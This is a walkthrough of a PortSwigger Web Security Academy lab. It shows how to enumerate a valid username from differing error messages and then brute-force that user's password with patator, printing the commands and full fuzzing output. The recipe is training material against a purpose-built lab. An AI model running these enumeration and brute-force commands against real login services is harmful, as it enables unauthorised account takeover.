# [Lab 1: Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

## Description

This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the following wordlists:

-   [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
-   [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

## Solution

Download the cadidate username and password word lists and browse to the target login form. Intercept a login request in BurpSuite to analyze its structure.

```http
POST /login HTTP/1.1
Host: ac181fd41eb4541780691d46001c0068.web-security-academy.net
Cookie: session=7VpltvntAKVyZlZWWdb4i1cmZlzJIqJl
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: https://ac181fd41eb4541780691d46001c0068.web-security-academy.net
Dnt: 1
Referer: https://ac181fd41eb4541780691d46001c0068.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=tgihf&password=pw
```

It is a simple HTTP POST submission with the username and password in the body as the parameters `username` and `password`, respectively. There is also the `session` cookie which is presumably authorizes access to the challenge within PortSwigger Web Security Academy, though that may not be necessary to access the challenge's login form.

Submitting the incorrect credentials renders the string `Invalid username` in the body of the response.

Bringing it all together, the following `patator` command can be used to brute force usernames from the given word list and ignore responses that contain the string `Invalid username`.

```bash
$ patator http_fuzz url=https://ac181fd41eb4541780691d46001c0068.web-security-academy.net/login method=POST body='username=FILE0&password=pw' 0=users.txt -x ignore:fgrep='Invalid username'

16:44:44 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-04 16:44 CDT
16:44:44 patator    INFO -                                                                              
16:44:44 patator    INFO - code size:clen       time | candidate                          |   num | mesg
16:44:44 patator    INFO - -----------------------------------------------------------------------------
16:44:49 patator    INFO - 200  3191:3004      0.131 | apple                              |    74 | HTTP/1.1 200 OK
```

The username `apple` is the only one that doesn't return `Invalid username`. Therefore, it must be valid.

Leveraging the password list, brute force the login form with `apple` as the username. Since the behavior of a successful login is unknown, all attempts' results will be rendered in the `patator` response for inspection.

```bash
$ patator http_fuzz url=https://ac181fd41eb4541780691d46001c0068.web-security-academy.net/login method=POST body='username=apple&password=FILE0' 0=passwords.txt

16:52:05 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-08-04 16:52 CDT                                                      
16:52:05 patator    INFO -                                                                                                                                                           
16:52:05 patator    INFO - code size:clen       time | candidate                          |   num | mesg                                                                             
16:52:05 patator    INFO - -----------------------------------------------------------------------------                                                                             
16:52:06 patator    INFO - 200  3191:3004      0.132 | 123456                             |     1 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.129 | password                           |     2 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.131 | 12345678                           |     3 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.124 | qwerty                             |     4 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.131 | 123456789                          |     5 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.130 | 12345                              |     6 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.123 | 1234                               |     7 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.127 | 111111                             |     8 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.129 | 1234567                            |     9 | HTTP/1.1 200 OK                                                                  
16:52:06 patator    INFO - 200  3191:3004      0.132 | dragon                             |    10 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.121 | 123123                             |    11 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.123 | baseball                           |    12 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.134 | abc123                             |    13 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.130 | football                           |    14 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.122 | monkey                             |    15 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.126 | letmein                            |    16 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.122 | shadow                             |    17 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.127 | 666666                             |    19 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.131 | master                             |    18 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.127 | qwertyuiop                         |    20 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.135 | 123321                             |    21 | HTTP/1.1 200 OK                                                                  
16:52:07 patator    INFO - 200  3191:3004      0.131 | mustang                            |    22 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.132 | 1234567890                         |    23 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.130 | michael                            |    24 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.130 | 654321                             |    25 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.127 | superman                           |    26 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.131 | 1qaz2wsx                           |    27 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.131 | 7777777                            |    28 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.129 | 121212                             |    29 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.138 | 000000                             |    30 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.131 | qazwsx                             |    31 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.127 | 123qwe                             |    32 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.124 | jordan                             |    35 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.132 | killer                             |    33 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.132 | trustno1                           |    34 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.131 | jennifer                           |    36 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.132 | zxcvbnm                            |    37 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.128 | asdfgh                             |    38 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.133 | hunter                             |    39 | HTTP/1.1 200 OK                                                                  
16:52:08 patator    INFO - 200  3191:3004      0.127 | buster                             |    40 | HTTP/1.1 200 OK                                                                  
16:52:09 patator    INFO - 200  3191:3004      0.132 | soccer                             |    41 | HTTP/1.1 200 OK                                                                  
16:52:09 patator    INFO - 200  3191:3004      0.124 | harley                             |    42 | HTTP/1.1 200 OK                                                                  
16:52:09 patator    INFO - 200  3191:3004      0.124 | tigger                             |    45 | HTTP/1.1 200 OK                                                                  
16:52:09 patator    INFO - 200  3191:3004      0.135 | batman                             |    43 | HTTP/1.1 200 OK                                                                  
16:52:09 patator    INFO - 200  3191:3004      0.144 | andrew                             |    44 | HTTP/1.1 200 OK                                                                  
16:52:09 patator    INFO - 200  3191:3004      0.134 | sunshine                           |    46 | HTTP/1.1 200 OK                                                                  
16:52:09 patator    INFO - 200  3191:3004      0.140 | iloveyou                           |    47 | HTTP/1.1 200 OK                                                                  
16:52:09 patator    INFO - 200  3191:3004      0.137 | 2000                               |    48 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.135 | charlie                            |    49 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.150 | robert                             |    50 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.130 | thomas                             |    51 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.128 | hockey                             |    52 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.128 | starwars                           |    55 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.153 | ranger                             |    53 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.129 | daniel                             |    54 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.130 | klaster                            |    56 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.129 | 112233                             |    57 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.128 | george                             |    58 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.127 | computer                           |    59 | HTTP/1.1 200 OK
16:52:09 patator    INFO - 200  3191:3004      0.128 | michelle                           |    60 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.129 | jessica                            |    61 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.133 | pepper                             |    62 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.126 | 555555                             |    65 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.134 | 11111111                           |    66 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.133 | 131313                             |    67 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.128 | 1111                               |    63 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.127 | zxcvbn                             |    64 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.129 | freedom                            |    68 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.122 | 777777                             |    69 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.136 | pass                               |    70 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.128 | maggie                             |    71 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.132 | 159753                             |    72 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.127 | princess                           |    75 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.134 | joshua                             |    76 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.134 | cheese                             |    77 | HTTP/1.1 200 OK
16:52:10 patator    INFO - 200  3191:3004      0.126 | summer                             |    79 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.125 | aaaaaa                             |    73 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.139 | ginger                             |    74 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.133 | amanda                             |    78 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.138 | love                               |    80 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.128 | ashley                             |    81 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.127 | nicole                             |    82 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.131 | matthew                            |    85 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.126 | chelsea                            |    83 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.123 | biteme                             |    84 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.131 | access                             |    86 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.131 | yankees                            |    87 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.127 | 987654321                          |    88 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.130 | dallas                             |    89 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.129 | austin                             |    90 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.152 | thunder                            |    91 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.132 | taylor                             |    92 | HTTP/1.1 200 OK
16:52:11 patator    INFO - 200  3191:3004      0.125 | mom                                |    95 | HTTP/1.1 200 OK
16:52:12 patator    INFO - 200  3191:3004      0.132 | matrix                             |    93 | HTTP/1.1 200 OK
16:52:12 patator    INFO - 200  3191:3004      0.134 | mobilemail                         |    94 | HTTP/1.1 200 OK
16:52:12 patator    INFO - 302  170:0          0.129 | monitor                            |    96 | HTTP/1.1 302 Found
16:52:12 patator    INFO - 200  3191:3004      0.134 | monitoring                         |    97 | HTTP/1.1 200 OK
16:52:12 patator    INFO - 200  3191:3004      0.125 | montana                            |    98 | HTTP/1.1 200 OK
16:52:12 patator    INFO - 200  3191:3004      0.129 | moon                               |    99 | HTTP/1.1 200 OK
16:52:12 patator    INFO - 200  3191:3004      0.128 | moscow                             |   100 | HTTP/1.1 200 OK
16:52:12 patator    INFO - Hits/Done/Skip/Fail/Size: 100/100/0/0/100, Avg: 15 r/s, Time: 0h 0m 6s
```

All of the responses were of length 3191 with a code of 200, except for the password `monitor` with a length of 170 and a code of 302.

Logging in with the credentials `apple`:`monitor` solves the challenge.